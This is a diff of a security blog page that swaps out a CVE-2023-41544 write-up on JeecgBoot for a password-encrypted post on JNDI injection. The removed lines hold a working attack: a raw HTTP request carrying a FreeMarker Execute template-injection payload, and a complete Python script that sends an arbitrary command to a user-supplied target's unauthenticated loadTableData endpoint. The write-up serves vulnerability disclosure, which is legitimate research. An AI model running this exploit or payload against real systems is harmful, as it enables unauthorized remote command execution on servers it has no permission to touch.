@@ -16,29 +16,24 @@
   <meta name="author" content="Pho3n1x">
   <meta name="keywords" content="">
   
-    <meta name="description" content="DescriptionThe JeecgBoot&#x2F;jeecg boot&#x2F;jmreport&#x2F;loadTableData Api interface does not have identity verification. Freemarker is used to process SQL parameters passed in by the user, and arb">
+    <meta name="description" content="这里有东西被加密了，需要输入密码查看哦。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2023-41544(JeecgBoot FreeMarker SSTI)">
-<meta property="og:url" content="https://pho3n1x-web.github.io/2023/09/18/CVE-2023-41544(JeecgBoot_SSTI)/index.html">
+<meta property="og:title" content="JNDI注入挖掘">
+<meta property="og:url" content="https://pho3n1x-web.github.io/2023/12/29/JNDI%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98/index.html">
 <meta property="og:site_name" content="Pho3n1x&#39;s Blog">
-<meta property="og:description" content="DescriptionThe JeecgBoot&#x2F;jeecg boot&#x2F;jmreport&#x2F;loadTableData Api interface does not have identity verification. Freemarker is used to process SQL parameters passed in by the user, and arb">
+<meta property="og:description" content="这里有东西被加密了，需要输入密码查看哦。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://pho3n1x-web.github.io/images/image-20230918173752359.png">
-<meta property="og:image" content="https://pho3n1x-web.github.io/images/image-20230918173803314.png">
-<meta property="article:published_time" content="2023-09-18T09:34:51.132Z">
-<meta property="article:modified_time" content="2023-09-18T09:39:34.440Z">
+<meta property="article:published_time" content="2023-12-29T07:14:17.439Z">
+<meta property="article:modified_time" content="2023-12-29T12:07:59.599Z">
 <meta property="article:author" content="Pho3n1x">
-<meta property="article:tag" content="CVE">
 <meta property="article:tag" content="代码审计">
-<meta property="article:tag" content="JeecgBoot">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://pho3n1x-web.github.io/images/image-20230918173752359.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>CVE-2023-41544(JeecgBoot FreeMarker SSTI) - Pho3n1x&#39;s Blog</title>
+  <title>JNDI注入挖掘 - Pho3n1x&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -244,7 +239,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CVE-2023-41544(JeecgBoot FreeMarker SSTI)"></span>
+            <span id="subtitle" data-typed-text="JNDI注入挖掘"></span>
           
         </div>
 
@@ -255,8 +250,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-18 17:34" pubdate>
-          September 18, 2023 pm
+        <time datetime="2023-12-29 15:14" pubdate>
+          December 29, 2023 pm
         </time>
       </span>
     
@@ -267,7 +262,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.8k words
+          1.9k words
         
       </span>
     
@@ -278,7 +273,7 @@
         
         
         
-          16 mins
+          8 mins
         
       </span>
     
@@ -315,31 +310,25 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CVE-2023-41544(JeecgBoot FreeMarker SSTI)</h1>
+            <h1 id="seo-header">JNDI注入挖掘</h1>
             
             
-              <div class="markdown-body">
-                
-                <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The JeecgBoot&#x2F;jeecg boot&#x2F;jmreport&#x2F;loadTableData Api interface does not have identity verification. Freemarker is used to process SQL parameters passed in by the user, and arbitrary code is executed on the application side through SSTI.</p>
-<h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p><code>/jeecg-boot/jmreport/loadTableData</code>interface has SSTI injection of FreeMarkerUtils</p>
-<p>Trace call stack</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.a</span>.c-&gt;this<span class="hljs-selector-class">.reportDbService</span><span class="hljs-selector-class">.parseReportSql</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.a</span>.parseReportSql-&gt;f<span class="hljs-selector-class">.a</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.f</span>.a-&gt;FreeMarkerUtils<span class="hljs-selector-class">.a</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.render</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.FreeMarkerUtils</span>.a-&gt;(new <span class="hljs-built_in">Template</span>(<span class="hljs-string">&quot;template&quot;</span>, new <span class="hljs-built_in">StringReader</span>(var0), var2))<span class="hljs-selector-class">.process</span>(var1, var3)<br></code></pre></td></tr></table></figure>
+              
+              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
+  <script id="hbeData" type="hbeData" data-hmacdigest="38a007caf66d13137e18166a19483756f2fbe659b6bc86625117f2fddc53958f">1174717c597af3f1f1c4d977105602bd151e12487199d2f7ea49624d863dcb8ad5f940311bc61e71729d9d20c19b1b0bc9d83a398794af1d8fa7406a1a0f71bdd7eea37514eebb7551124c68c146a4e324e188483d38310d9356df1713f1d957977d719dac8e20d393f33877ffbffcb9bb8e87e3b52ce2d9460b36cf4546a33f6eb33f10deeb0af1df9539a4fc247b031e290a9c1e5869288ef38390970ae780e067a02d0f272444dee393050a99d04fc67d2caa9107c58a14028545055ea92b4d21bf6f5d0e3ec0632aa9e630955aa0aeb7dedf40011f5ec76c7de906f73ef359ed8fa7fad01531a8642c31821b75badec0cc717a301bdbd3bd2c768b083b5885ab5f81c51c4a1b0389923baf6089268756e9eae4894162ff458532599368de52e87145349655b08506873e7ba96d4e06f735851f76f88cca97b7cfbd2c0212f6a02103236fec68205d025e9684c175cd92c40441b6adc76814792a84c088c055a47bf6af5b73b7fb78c5aca4804c58deda4389387d5f2f1db63d6914ada29e8c31040c7e30715012e13a4856885bed51aa295b3538190f1cb1dda063b735339df01e4057dcff018d96443a13b7746035313c956b9a9f2b00e8c42478d930a8950ca65544251f56a0dfa5c491bcec4157f8e4fa90a8e0533ee841a7656df86d7b661d3d5e6a601f0ed39e707f54da07e23461137312e030885880392834b350bd44f8ed46a50b452180a518e10712c1031669cdfc4a57d4250426678822b8d4f5effca09eb471fccdc5f9f2d6c2e42be3fe3bee17f75c2630a353cd8a65f3f4dbffda509af4120506418e245f8bb8e59ec7823656db116e80cb138bcdc225a49f67fbf286e31306d7d162dbba34a295e450017a4ed68142965c58b88b912957dc3f7b20a763690fa74ead912a68dd760d417fdbe5fd7047d8b6ac835b63d4f372598066ab3af426db87dc9424d0149a5cb69fe2f389ce565c02dc6ce5f55ceff4728d587c6976aacfeb78a6591e9d7222b1c00087d5cf1dd379ac48315ba6ba3fc30efeefc5a74bb4f95aafbbe3a9b981b35567c0a138416ef8716210a74075850a84a24a3a280d654fbdee07aa9467671dd43c22a11b1ebe8a3d4994ba7fd5ada32495b4588c1eea0d71540c68cef0dcbeb1f38741fe26537db8508077993a0caf694a7696751f61436de8c4f3f94c7ecea1ea76d3178a2133f6609d4658dc46272228d71eb065bada2a3ebd239f52ca0bcc095972c1c0464898b705690839c13ef475e75a705cf48a0db65b4adfc30ed60bae18b5f89b3ca5e4994b3d6431</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+              
 
-<p>By writing a payload with a freemarker template in the SQL parameters, template parsing can be triggered, resulting in template injection. Additionally, this version does not restrict classes, so template injection can cause arbitrary command execution</p>
-<p>From Routing Processing Logic to the LoadTableData Function</p>
-<p><img src="/./../images/image-20230918173752359.png" srcset="/img/loading.gif" lazyload alt="image-20230918173752359"></p>
-<p>Then use f.a to parse the Freemarker template for SQL</p>
-<p><img src="/./../images/image-20230918173803314.png" srcset="/img/loading.gif" lazyload alt="image-20230918173803314"></p>
-<p>So we can construct the request</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/jeecg-boot/jmreport/loadTableData</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8088<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">X-Sign</span><span class="hljs-punctuation">: </span>8DFA6138EFBF3D5ECA9D62F6FB80C84D<br><span class="hljs-attribute">X-TIMESTAMP</span><span class="hljs-punctuation">: </span>1692975637994<br><span class="hljs-attribute">X-Access-Token</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">token</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">JmReport-Tenant-Id</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>178<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8088<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql">&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="hljs-keyword">template</span>.utility.<span class="hljs-keyword">Execute</span>\&quot;?new()&gt; $&#123; ex(\&quot;cmd /c calc\&quot;) &#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:<span class="hljs-number">1</span>,&quot;pageSize&quot;:<span class="hljs-number">10</span>&#125;</span><br></code></pre></td></tr></table></figure>
-
-<h4 id="The-actual-payload-is-in-the-SQL-parameters"><a href="#The-actual-payload-is-in-the-SQL-parameters" class="headerlink" title="The actual payload is in the SQL parameters"></a>The actual payload is in the SQL parameters</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;result:&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; ex(\&quot;cmd /c calc\&quot;) &#125;&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<h4 id="The-complete-utilization-script-is-as-follows"><a href="#The-complete-utilization-script-is-as-follows" class="headerlink" title="The complete utilization script is as follows"></a>The complete utilization script is as follows</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invokecmd</span>(<span class="hljs-params">url,cmd</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/jmreport/loadTableData&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    payload=<span class="hljs-string">&quot;&quot;&quot;&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; $&#123; ex(\\\&quot;&quot;&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;&quot;&quot; \\&quot;) &#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:1,&quot;pageSize&quot;:10&#125;&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(payload)<br>    response=requests.post(url,headers=headers,data=payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;命令执行成功&quot;</span>)<br><span class="hljs-comment"># invokecmd(&quot;http://localhost:8088&quot;,&quot;calc&quot;)</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your target: (example:http://localhost:8088)&quot;</span>)<br>    cmd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your command: &quot;</span>)<br>    invokecmd(url,cmd)<br></code></pre></td></tr></table></figure>
-
-
-                
-              </div>
+              
             
             <hr/>
             <div>
@@ -355,7 +344,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
+  <a href="/categories/rce/" class="category-chain-item">rce</a>
   
   
 
@@ -370,11 +359,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
-      
         <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
-      
-        <a href="/tags/JeecgBoot/" class="print-no-link">#JeecgBoot</a>
       
     </div>
   
@@ -386,8 +371,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CVE-2023-41544(JeecgBoot FreeMarker SSTI)</div>
-      <div>https://pho3n1x-web.github.io/2023/09/18/CVE-2023-41544(JeecgBoot_SSTI)/</div>
+      <div>JNDI注入挖掘</div>
+      <div>https://pho3n1x-web.github.io/2023/12/29/JNDI注入挖掘/</div>
     </div>
     <div class="license-meta">
       
@@ -399,7 +384,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>September 18, 2023</div>
+          <div>December 29, 2023</div>
         </div>
       
       
@@ -424,18 +409,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/26/LimeSurvey_GetShell/" title="LimeSurvey GetShell">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">LimeSurvey GetShell</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/18/CVE-2023-41543(JeecgBoot_sql)/" title="CVE-2023-41543(JeecgBoot Sql Injection)">
-                        <span class="hidden-mobile">CVE-2023-41543(JeecgBoot Sql Injection)</span>
+                      <a href="/2023/12/29/Java_JDBC(commonscollection3.2.3)Bypass/" title="Java_JDBC(commonscollection3.2.3)Bypass">
+                        <span class="hidden-mobile">Java_JDBC(commonscollection3.2.3)Bypass</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -615,6 +594,23 @@
   
 
 
+
+
+  
+  <script defer>
+    if (document.getElementById('hbePass') || document.querySelector('hbe-prefix')) {
+      Fluid.utils.waitElementLoaded('hbe-prefix', function() {
+        var hbePrefix = document.querySelector('hbe-prefix');
+        hbePrefix.parentElement.classList.add('markdown-body');
+        Fluid.utils.retry(function() {
+          if (Fluid.boot && Fluid.boot.refresh) {
+            Fluid.boot.refresh();
+            return true;
+          }
+        }, 100, 10);
+      })
+    }
+  </script>
 
 
   
